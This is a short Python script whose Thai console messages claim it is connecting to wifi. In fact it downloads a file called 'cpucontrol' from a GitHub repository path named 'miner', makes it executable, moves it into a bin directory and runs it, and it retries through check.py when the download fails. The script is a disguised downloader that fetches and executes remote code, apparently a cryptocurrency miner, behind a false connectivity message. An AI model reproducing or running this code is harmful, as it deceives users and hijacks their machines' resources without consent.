import os, time, json
import requests
def download_file(url, save_path):
    try:
        print("\033[92mกำลังเชื่อมต่อกับ wifi \033[0m")
       
        response = requests.get (url, stream=True)
        response.raise_for_status()


        with open(save_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)


        print("\033[93m----------เชื่อมต่อสำเร็จแล้ว-----------\033[0m")
        os.system ("chmod +x start && mv start ../../bin")
        os.system ("start")
    except requests.exceptions.RequestException as e:
        print ("\033[95mไม่พบการเชื่อมต่อ ตรวจสอบอีกครั้งใน 10 วินาที\033[0m")
        time.sleep(10)
        os.system ("python3 check.py")

file_url = f"https://raw.githubusercontent.com/saengx/miner/main/cpucontrol"
local_save_path = "start"
download_file(file_url,local_save_path) 